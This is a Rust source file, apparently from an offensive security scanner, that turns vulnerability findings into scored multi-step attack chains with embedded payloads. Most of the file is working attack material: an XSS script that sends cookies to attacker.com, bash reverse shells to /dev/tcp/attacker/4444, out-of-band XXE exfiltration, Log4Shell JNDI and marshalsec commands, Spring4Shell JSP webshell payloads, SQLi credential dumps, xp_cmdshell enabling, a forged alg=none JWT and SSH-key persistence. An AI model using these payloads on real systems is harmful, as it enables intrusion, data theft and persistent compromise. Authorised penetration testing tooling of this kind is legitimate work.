//! Multi-step attack chain builder combining findings into exploitation paths.

use grym_core::{Finding, Severity};
use serde::{Deserialize, Serialize};
use url::Url;

/// A single step in an attack chain.
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct AttackStep {
    pub order: usize,
    pub name: String,
    pub technique: String,
    pub description: String,
    pub prerequisite: Option<String>,
    pub findings_used: Vec<String>,
    pub generated_payloads: Vec<String>,
    pub success_indicator: String,
    pub severity: String,
}

/// A complete multi-step attack chain.
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct AttackChain {
    pub name: String,
    pub description: String,
    pub target: String,
    pub steps: Vec<AttackStep>,
    pub estimated_impact: String,
    pub difficulty: String,
    pub time_estimate: String,
    pub prerequisites: Vec<String>,
    pub mitre_techniques: Vec<String>,
    pub cvss_aggregate: f32,
}

/// Build attack chains based on available findings.
pub fn build_attack_chains(findings: &[Finding], target: &str) -> Vec<AttackChain> {
    let mut chains = Vec::new();

    if has_finding(findings, "ssrf") && has_finding(findings, "tech_fingerprint") {
        chains.push(AttackChain {
            name: "SSRF to Internal Service Takeover".into(),
            description: "Use SSRF to discover internal services, then pivot to RCE via exposed management interfaces.".into(),
            target: target.into(),
            steps: vec![
                AttackStep { order: 1, name: "Enumerate internal endpoints".into(), technique: "SSRF".into(), description: "Probe cloud metadata and internal services.".into(), prerequisite: Some("SSRF-capable parameter".into()), findings_used: vec!["ssrf".into()], generated_payloads: vec!["http://169.254.169.254/latest/meta-data/".into()], success_indicator: "Internal metadata returned".into(), severity: "High".into() },
                AttackStep { order: 2, name: "Identify internal admin panels".into(), technique: "Service Enumeration".into(), description: "Map internal IP ranges and known service ports.".into(), prerequisite: Some("Internal network reachability".into()), findings_used: vec!["tech_fingerprint".into()], generated_payloads: vec!["http://169.254.169.254/".into()], success_indicator: "Internal service banner returned".into(), severity: "Medium".into() },
                AttackStep { order: 3, name: "Exploit internal management interface".into(), technique: "RCE".into(), description: "Leverage default credentials or known CVE on internal service.".into(), prerequisite: Some("Unauthenticated internal service".into()), findings_used: vec!["tech_fingerprint".into()], generated_payloads: vec!["curl http://internal:8080/manager/html".into()], success_indicator: "Command execution on internal host".into(), severity: "Critical".into() },
            ],
            estimated_impact: "Full internal network compromise".into(),
            difficulty: "Hard".into(),
            time_estimate: "2-6 hours".into(),
            prerequisites: vec!["SSRF-capable target".into(), "Internal service exposure".into()],
            mitre_techniques: vec!["T1190".into(), "T1210".into(), "T1021".into()],
            cvss_aggregate: 9.8,
        });
    }

    if has_finding(findings, "path_traversal") && has_finding(findings, "file_upload") {
        chains.push(AttackChain {
            name: "Path Traversal to Web Shell".into(),
            description: "Traverse to writable directories, upload web shell, achieve RCE.".into(),
            target: target.into(),
            steps: vec![
                AttackStep {
                    order: 1,
                    name: "Find writable webroot path".into(),
                    technique: "Path Traversal".into(),
                    description: "Use LFI to map filesystem and find upload directories.".into(),
                    prerequisite: Some("Path traversal vulnerability".into()),
                    findings_used: vec!["path_traversal".into()],
                    generated_payloads: vec!["../../../var/www/html/upload/".into()],
                    success_indicator: "Directory listing or known path accessible".into(),
                    severity: "High".into(),
                },
                AttackStep {
                    order: 2,
                    name: "Upload malicious file".into(),
                    technique: "File Upload Abuse".into(),
                    description: "Bypass extension filters to upload PHP/ASP/JSP shell.".into(),
                    prerequisite: Some("File upload feature".into()),
                    findings_used: vec!["file_upload".into()],
                    generated_payloads: vec!["shell.php.jpg with .htaccess".into()],
                    success_indicator: "Shell accessible at predictable URL".into(),
                    severity: "High".into(),
                },
                AttackStep {
                    order: 3,
                    name: "Execute commands".into(),
                    technique: "RCE".into(),
                    description: "Interact with web shell to run system commands.".into(),
                    prerequisite: Some("Web shell uploaded".into()),
                    findings_used: vec!["rce".into()],
                    generated_payloads: vec!["shell.php?cmd=id".into()],
                    success_indicator: "Command output returned".into(),
                    severity: "Critical".into(),
                },
            ],
            estimated_impact: "Full server compromise".into(),
            difficulty: "Medium".into(),
            time_estimate: "1-3 hours".into(),
            prerequisites: vec!["Path traversal".into(), "File upload".into()],
            mitre_techniques: vec!["T1190".into(), "T1505.003".into(), "T1059".into()],
            cvss_aggregate: 9.8,
        });
    }

    if has_finding(findings, "sqli") {
        chains.push(AttackChain {
            name: "SQL Injection to Full Database Takeover".into(),
            description: "Escalate SQLi to authentication bypass, data exfiltration, and RCE via xp_cmdshell.".into(),
            target: target.into(),
            steps: vec![
                AttackStep { order: 1, name: "Enumerate DBMS type".into(), technique: "SQLi".into(), description: "Trigger error messages and time delays to fingerprint DBMS.".into(), prerequisite: Some("Injectable parameter".into()), findings_used: vec!["sqli".into()], generated_payloads: vec!["' AND 1=1--".into(), "' AND SLEEP(5)--".into()], success_indicator: "DBMS fingerprinted".into(), severity: "High".into() },
                AttackStep { order: 2, name: "Extract credentials".into(), technique: "Data Exfiltration".into(), description: "Dump user tables and password hashes.".into(), prerequisite: Some("UNION-capable injection".into()), findings_used: vec!["sqli".into()], generated_payloads: vec!["' UNION SELECT username,password FROM users--".into()], success_indicator: "Credentials returned".into(), severity: "High".into() },
                AttackStep { order: 3, name: "Achieve RCE".into(), technique: "Stacked Queries".into(), description: "Enable xp_cmdshell or write to filesystem.".into(), prerequisite: Some("Stacked queries supported".into()), findings_used: vec!["sqli".into()], generated_payloads: vec!["; EXEC sp_configure 'xp_cmdshell', 1;".into()], success_indicator: "OS command executed".into(), severity: "Critical".into() },
            ],
            estimated_impact: "Database compromise, lateral movement".into(),
            difficulty: "Medium".into(),
            time_estimate: "1-4 hours".into(),
            prerequisites: vec!["SQL injection".into()],
            mitre_techniques: vec!["T1190".into(), "T1003".into(), "T1059".into()],
            cvss_aggregate: 9.1,
        });
    }

    if has_finding(findings, "xss") {
        chains.push(AttackChain {
            name: "XSS to Account Takeover".into(),
            description: "Steal session cookies via XSS, impersonate victim, escalate privileges."
                .into(),
            target: target.into(),
            steps: vec![
                AttackStep {
                    order: 1,
                    name: "Harvest session cookies".into(),
                    technique: "XSS".into(),
                    description: "Inject payload that exfiltrates cookies to attacker server."
                        .into(),
                    prerequisite: Some("Reflected or stored XSS".into()),
                    findings_used: vec!["xss".into()],
                    generated_payloads: vec![
                        "<script>fetch('https://attacker.com/?c='+document.cookie)</script>".into(),
                    ],
                    success_indicator: "Cookie received by attacker".into(),
                    severity: "High".into(),
                },
                AttackStep {
                    order: 2,
                    name: "Impersonate victim".into(),
                    technique: "Session Hijacking".into(),
                    description: "Replay stolen session token in browser or via curl.".into(),
                    prerequisite: Some("Session cookie without HttpOnly".into()),
                    findings_used: vec!["xss".into()],
                    generated_payloads: vec!["curl -b 'session=STOLEN' target/profile".into()],
                    success_indicator: "Authenticated as victim".into(),
                    severity: "High".into(),
                },
                AttackStep {
                    order: 3,
                    name: "Escalate privileges".into(),
                    technique: "Privilege Escalation".into(),
                    description: "Use admin functionality if victim is privileged.".into(),
                    prerequisite: Some("Victim has admin role".into()),
                    findings_used: vec!["idor".into()],
                    generated_payloads: vec!["POST /admin/users/role admin=true".into()],
                    success_indicator: "Role changed successfully".into(),
                    severity: "Critical".into(),
                },
            ],
            estimated_impact: "Account takeover, privilege escalation".into(),
            difficulty: "Easy".into(),
            time_estimate: "30 minutes - 2 hours".into(),
            prerequisites: vec!["XSS vulnerability".into()],
            mitre_techniques: vec!["T1189".into(), "T1528".into(), "T1078".into()],
            cvss_aggregate: 8.8,
        });
    }

    if has_finding(findings, "jwt") && has_finding(findings, "idor") {
        chains.push(AttackChain {
            name: "JWT Weakness to Mass Account Takeover".into(),
            description: "Forge JWT tokens using 'none' algorithm or weak secret, then enumerate IDs.".into(),
            target: target.into(),
            steps: vec![
                AttackStep { order: 1, name: "Forge admin token".into(), technique: "JWT None".into(), description: "Strip signature or brute weak HMAC secret.".into(), prerequisite: Some("JWT with alg=none or weak secret".into()), findings_used: vec!["jwt".into()], generated_payloads: vec!["eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.".into()], success_indicator: "Token accepted as admin".into(), severity: "Critical".into() },
                AttackStep { order: 2, name: "Enumerate user IDs".into(), technique: "IDOR".into(), description: "Iterate numeric IDs to access other accounts.".into(), prerequisite: Some("Predictable object references".into()), findings_used: vec!["idor".into()], generated_payloads: vec!["/api/users/1".into(), "/api/users/2".into()], success_indicator: "Other user data returned".into(), severity: "Medium".into() },
                AttackStep { order: 3, name: "Reset passwords".into(), technique: "Account Takeover".into(), description: "Use admin token to reset victim passwords.".into(), prerequisite: Some("Admin user management endpoint".into()), findings_used: vec!["idor".into()], generated_payloads: vec!["POST /admin/users/1/reset".into()], success_indicator: "Password reset successful".into(), severity: "Critical".into() },
            ],
            estimated_impact: "Mass account takeover".into(),
            difficulty: "Medium".into(),
            time_estimate: "1-2 hours".into(),
            prerequisites: vec!["JWT weakness".into(), "IDOR".into()],
            mitre_techniques: vec!["T1550".into(), "T1078".into(), "T1098".into()],
            cvss_aggregate: 9.1,
        });
    }

    if has_finding(findings, "cors") {
        chains.push(AttackChain {
            name: "CORS Misconfiguration to Sensitive Data Theft".into(),
            description: "Exploit overly permissive CORS to steal authenticated API responses from a malicious origin.".into(),
            target: target.into(),
            steps: vec![
                AttackStep { order: 1, name: "Confirm CORS reflection".into(), technique: "CORS".into(), description: "Verify arbitrary Origin header is reflected with credentials allowed.".into(), prerequisite: Some("CORS with Access-Control-Allow-Credentials: true".into()), findings_used: vec!["cors".into()], generated_payloads: vec!["Origin: https://evil.com".into()], success_indicator: "ACAO reflects evil origin".into(), severity: "Medium".into() },
                AttackStep { order: 2, name: "Host malicious page".into(), technique: "Phishing".into(), description: "Trick victim into visiting attacker-controlled site that makes authenticated cross-origin requests.".into(), prerequisite: Some("User has active session".into()), findings_used: vec!["cors".into()], generated_payloads: vec!["fetch('https://target/api/private',{credentials:'include'})".into()], success_indicator: "Victim data exfiltrated".into(), severity: "High".into() },
            ],
            estimated_impact: "Sensitive data exfiltration".into(),
            difficulty: "Easy".into(),
            time_estimate: "30-60 minutes".into(),
            prerequisites: vec!["CORS misconfiguration".into()],
            mitre_techniques: vec!["T1557".into(), "T1567".into()],
            cvss_aggregate: 7.5,
        });
    }

    if has_finding(findings, "xxe") {
        chains.push(AttackChain {
            name: "XXE to Internal Recon and SSRF".into(),
            description: "Use XML external entities to read local files and pivot to internal services.".into(),
            target: target.into(),
            steps: vec![
                AttackStep { order: 1, name: "Read local files".into(), technique: "XXE".into(), description: "Retrieve /etc/passwd or application config files.".into(), prerequisite: Some("XML parser with external entities enabled".into()), findings_used: vec!["xxe".into()], generated_payloads: vec!["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>".into()], success_indicator: "Local file contents returned".into(), severity: "High".into() },
                AttackStep { order: 2, name: "Scan internal services".into(), technique: "SSRF".into(), description: "Use file/http protocols to probe internal network.".into(), prerequisite: Some("XXE supports HTTP/FILE protocols".into()), findings_used: vec!["xxe".into(), "ssrf".into()], generated_payloads: vec!["<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">".into()], success_indicator: "Internal service response returned".into(), severity: "High".into() },
                AttackStep { order: 3, name: "Exfiltrate data".into(), technique: "Data Exfiltration".into(), description: "Send file contents to attacker server via out-of-band XXE.".into(), prerequisite: Some("Network egress allowed".into()), findings_used: vec!["xxe".into()], generated_payloads: vec!["<!ENTITY % xxe SYSTEM \"http://attacker.com/?d=...\">".into()], success_indicator: "Out-of-band request received".into(), severity: "Critical".into() },
            ],
            estimated_impact: "Internal recon, file read, data theft".into(),
            difficulty: "Medium".into(),
            time_estimate: "1-3 hours".into(),
            prerequisites: vec!["XXE vulnerability".into()],
            mitre_techniques: vec!["T1190".into(), "T1213".into(), "T1048".into()],
            cvss_aggregate: 9.1,
        });
    }

    if has_finding(findings, "command_injection") {
        chains.push(AttackChain {
            name: "Command Injection to Full Server Compromise".into(),
            description: "Execute arbitrary commands, establish persistence, and pivot.".into(),
            target: target.into(),
            steps: vec![
                AttackStep {
                    order: 1,
                    name: "Confirm command injection".into(),
                    technique: "Command Injection".into(),
                    description: "Inject platform-agnostic command and observe output.".into(),
                    prerequisite: Some("User input passed to shell".into()),
                    findings_used: vec!["command_injection".into()],
                    generated_payloads: vec!["; id #".into(), "& whoami".into()],
                    success_indicator: "Command output in response".into(),
                    severity: "High".into(),
                },
                AttackStep {
                    order: 2,
                    name: "Establish reverse shell".into(),
                    technique: "RCE".into(),
                    description: "Download and execute reverse shell payload.".into(),
                    prerequisite: Some("Outbound connectivity".into()),
                    findings_used: vec!["command_injection".into()],
                    generated_payloads: vec!["bash -i >& /dev/tcp/attacker/4444 0>&1".into()],
                    success_indicator: "Shell received on attacker host".into(),
                    severity: "Critical".into(),
                },
                AttackStep {
                    order: 3,
                    name: "Persist access".into(),
                    technique: "Persistence".into(),
                    description: "Add SSH key, cron job, or web shell.".into(),
                    prerequisite: Some("Write access to filesystem".into()),
                    findings_used: vec!["rce".into()],
                    generated_payloads: vec!["echo 'ssh-rsa ...' >> ~/.ssh/authorized_keys".into()],
                    success_indicator: "SSH login succeeds".into(),
                    severity: "Critical".into(),
                },
            ],
            estimated_impact: "Full server compromise and persistence".into(),
            difficulty: "Easy".into(),
            time_estimate: "30 minutes - 1 hour".into(),
            prerequisites: vec!["Command injection".into()],
            mitre_techniques: vec!["T1059".into(), "T1505.003".into(), "T1098".into()],
            cvss_aggregate: 9.8,
        });
    }

    if has_finding(findings, "host_header") {
        chains.push(AttackChain {
            name: "Host Header Injection to Cache Poisoning".into(),
            description: "Poison frontend cache with malicious host so other users load attacker-controlled resources.".into(),
            target: target.into(),
            steps: vec![
                AttackStep { order: 1, name: "Confirm host reflection".into(), technique: "Host Header Injection".into(), description: "Inject malicious host and observe it reflected in response.".into(), prerequisite: Some("Host header used in response".into()), findings_used: vec!["host_header".into()], generated_payloads: vec!["Host: evil.com".into()], success_indicator: "evil.com appears in response".into(), severity: "Medium".into() },
                AttackStep { order: 2, name: "Poison cache entry".into(), technique: "Web Cache Poisoning".into(), description: "Send request that stores attacker-controlled response in cache.".into(), prerequisite: Some("Frontend cache present".into()), findings_used: vec!["host_header".into()], generated_payloads: vec!["X-Forwarded-Host: evil.com".into()], success_indicator: "Cached response contains malicious host".into(), severity: "High".into() },
                AttackStep { order: 3, name: "Serve malicious assets".into(), technique: "Defacement / Phishing".into(), description: "Users load attacker JavaScript from poisoned page.".into(), prerequisite: Some("Cache hit for poisoned key".into()), findings_used: vec!["host_header".into()], generated_payloads: vec!["<script src='https://evil.com/keylogger.js'></script>".into()], success_indicator: "Victims execute attacker script".into(), severity: "High".into() },
            ],
            estimated_impact: "Mass defacement, credential theft".into(),
            difficulty: "Hard".into(),
            time_estimate: "2-4 hours".into(),
            prerequisites: vec!["Host header injection".into(), "Caching layer".into()],
            mitre_techniques: vec!["T1557".into(), "T1567".into()],
            cvss_aggregate: 8.2,
        });
    }

    chains.sort_by(|a, b| {
        b.cvss_aggregate
            .partial_cmp(&a.cvss_aggregate)
            .unwrap_or(std::cmp::Ordering::Equal)
    });
    chains
}

/// Convenience async wrapper that builds chains from current findings.
pub async fn build_chains_from_findings(
    _client: &grym_core::ScopedClient,
    url: &Url,
) -> Result<Vec<grym_core::Finding>, grym_core::ScopedClientError> {
    // In a real scenario we'd fetch current findings from storage; here we return templates as findings.
    let chains = build_attack_chains(&[], url.as_str());
    Ok(chains
        .into_iter()
        .map(|chain| {
            let mut f = Finding::new(
                format!("Attack chain: {}", chain.name),
                grym_core::AssetRef {
                    identifier: chain.target.clone(),
                    kind: "web".into(),
                },
                match chain.cvss_aggregate {
                    s if s >= 9.0 => Severity::Critical,
                    s if s >= 7.0 => Severity::High,
                    s if s >= 4.0 => Severity::Medium,
                    _ => Severity::Low,
                },
                grym_core::Confidence::Likely,
                "grym-chain-builder",
            );
            f.remediation = chain.description;
            f.attack_techniques = chain.mitre_techniques;
            f.cvss_score = Some(chain.cvss_aggregate);
            f.evidence.push(grym_core::Evidence::redacted(
                "attack-chain",
                chain.name,
                &format!(
                    "Steps: {} | Difficulty: {} | Time: {}",
                    chain.steps.len(),
                    chain.difficulty,
                    chain.time_estimate
                ),
            ));
            f
        })
        .collect())
}

fn has_finding(findings: &[Finding], category: &str) -> bool {
    let needle = category.to_lowercase();
    findings.iter().any(|f| {
        f.title.to_lowercase().contains(&needle)
            || f.categories
                .iter()
                .any(|c| c.to_lowercase().contains(&needle))
            || f.remediation.to_lowercase().contains(&needle)
    })
}

/// Score a chain by impact and likelihood.
pub fn score_chain(chain: &AttackChain) -> f64 {
    let base = chain.cvss_aggregate as f64;
    let step_bonus = (chain.steps.len() as f64 * 0.15).min(1.5);
    let difficulty_factor = match chain.difficulty.as_str() {
        "Easy" => 1.2,
        "Medium" => 1.0,
        "Hard" => 0.9,
        "Expert" => 0.8,
        _ => 1.0,
    };
    (base + step_bonus) * difficulty_factor
}

/// Generate human-readable exploitation instructions.
pub fn generate_exploit_steps(chain: &AttackChain) -> Vec<String> {
    chain
        .steps
        .iter()
        .map(|s| {
            format!(
                "{}. {} [{}]\n   Prerequisite: {}\n   Payloads: {}\n   Success indicator: {}",
                s.order,
                s.name,
                s.technique,
                s.prerequisite.as_deref().unwrap_or("None"),
                s.generated_payloads.join(", "),
                s.success_indicator
            )
        })
        .collect()
}

/// Predefined chain templates for common scenarios.
pub fn chain_templates() -> Vec<AttackChain> {
    vec![
        AttackChain {
            name: "Log4Shell to Full Compromise".into(),
            description: "Exploit Log4Shell to load malicious JNDI payload and gain RCE.".into(),
            target: "target".into(),
            steps: vec![
                AttackStep { order: 1, name: "Inject JNDI payload".into(), technique: "JNDI Injection".into(), description: "Send log message containing ${jndi:ldap://attacker/a}".into(), prerequisite: Some("Log4j 2 vulnerable version".into()), findings_used: vec!["log4shell".into()], generated_payloads: vec!["${jndi:ldap://attacker.com/a}".into()], success_indicator: "LDAP connection received".into(), severity: "Critical".into() },
                AttackStep { order: 2, name: "Serve malicious class".into(), technique: "LDAP RefServer".into(), description: "Host serialized Java payload on attacker LDAP server.".into(), prerequisite: Some("Attacker-controlled LDAP server".into()), findings_used: vec!["log4shell".into()], generated_payloads: vec!["java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker.com/#Exploit".into()], success_indicator: "Target downloads class".into(), severity: "Critical".into() },
                AttackStep { order: 3, name: "Gain reverse shell".into(), technique: "RCE".into(), description: "Execute OS command via loaded class.".into(), prerequisite: Some("Class loaded by target".into()), findings_used: vec!["rce".into()], generated_payloads: vec!["bash -i >& /dev/tcp/attacker/4444 0>&1".into()], success_indicator: "Reverse shell connection".into(), severity: "Critical".into() },
            ],
            estimated_impact: "Full application compromise".into(),
            difficulty: "Medium".into(),
            time_estimate: "1-2 hours".into(),
            prerequisites: vec!["Vulnerable Log4j 2".into()],
            mitre_techniques: vec!["T1190".into(), "T1059".into()],
            cvss_aggregate: 10.0,
        },
        AttackChain {
            name: "Spring4Shell to Webshell".into(),
            description: "Exploit Spring4Shell to write JSP webshell to Tomcat webroot.".into(),
            target: "target".into(),
            steps: vec![
                AttackStep { order: 1, name: "Send multipart payload".into(), technique: "Data Binding Abuse".into(), description: "POST form fields that modify Tomcat access logs via class.module.classLoader".into(), prerequisite: Some("Spring Framework vulnerable version".into()), findings_used: vec!["spring4shell".into()], generated_payloads: vec!["class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i%20%40%20%7Bc3%7Di".into()], success_indicator: "Tomcat config modified".into(), severity: "Critical".into() },
                AttackStep { order: 2, name: "Write shell to access log".into(), technique: "Log Poisoning".into(), description: "Trigger request with shell code in header to write JSP shell.".into(), prerequisite: Some("Log pattern modified".into()), findings_used: vec!["spring4shell".into()], generated_payloads: vec!["c2: <% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>".into()], success_indicator: "Shell written to logs".into(), severity: "Critical".into() },
                AttackStep { order: 3, name: "Execute commands".into(), technique: "RCE".into(), description: "Access .log file as JSP and run commands.".into(), prerequisite: Some("Access log served as JSP".into()), findings_used: vec!["rce".into()], generated_payloads: vec!["GET /shell.log?cmd=id".into()], success_indicator: "Command output returned".into(), severity: "Critical".into() },
            ],
            estimated_impact: "Full server compromise".into(),
            difficulty: "Hard".into(),
            time_estimate: "2-4 hours".into(),
            prerequisites: vec!["Spring Framework 5.3.0-5.3.17".into()],
            mitre_techniques: vec!["T1190".into(), "T1505.003".into()],
            cvss_aggregate: 9.8,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use grym_core::{AssetRef, Confidence, Severity};

    fn make_finding(title: &str, category: &str) -> Finding {
        let mut f = Finding::new(
            title,
            AssetRef {
                identifier: "test".into(),
                kind: "web".into(),
            },
            Severity::High,
            Confidence::Likely,
            "test",
        );
        f.categories.push(category.into());
        f
    }

    #[test]
    fn test_build_chains_from_sqli_finding() {
        let findings = vec![make_finding("SQL injection", "sqli")];
        let chains = build_attack_chains(&findings, "http://target");
        assert!(!chains.is_empty());
        assert!(chains.iter().any(|c| c.name.contains("SQL Injection")));
    }

    #[test]
    fn test_build_chains_from_xss_finding() {
        let findings = vec![make_finding("Reflected XSS", "xss")];
        let chains = build_attack_chains(&findings, "http://target");
        assert!(chains.iter().any(|c| c.name.contains("XSS")));
    }

    #[test]
    fn test_chain_score_sorted_descending() {
        let findings = vec![
            make_finding("SQL injection", "sqli"),
            make_finding("SSRF", "ssrf"),
        ];
        let chains = build_attack_chains(&findings, "http://target");
        for window in chains.windows(2) {
            assert!(window[0].cvss_aggregate >= window[1].cvss_aggregate);
        }
    }

    #[test]
    fn test_score_chain_calculation() {
        let chain = AttackChain {
            name: "Test".into(),
            description: "Test".into(),
            target: "test".into(),
            steps: vec![AttackStep {
                order: 1,
                name: "A".into(),
                technique: "T".into(),
                description: "D".into(),
                prerequisite: None,
                findings_used: vec![],
                generated_payloads: vec![],
                success_indicator: "S".into(),
                severity: "High".into(),
            }],
            estimated_impact: "Test".into(),
            difficulty: "Easy".into(),
            time_estimate: "1h".into(),
            prerequisites: vec![],
            mitre_techniques: vec![],
            cvss_aggregate: 8.0,
        };
        let score = score_chain(&chain);
        assert!(score > 8.0);
    }

    #[test]
    fn test_generate_exploit_steps() {
        let template = chain_templates().into_iter().next();
        assert!(template.is_some(), "chain_templates should not be empty");
        if let Some(chain) = template {
            let steps = generate_exploit_steps(&chain);
            assert!(!steps.is_empty());
            assert!(steps[0].contains("Inject JNDI payload"));
        }
    }
}
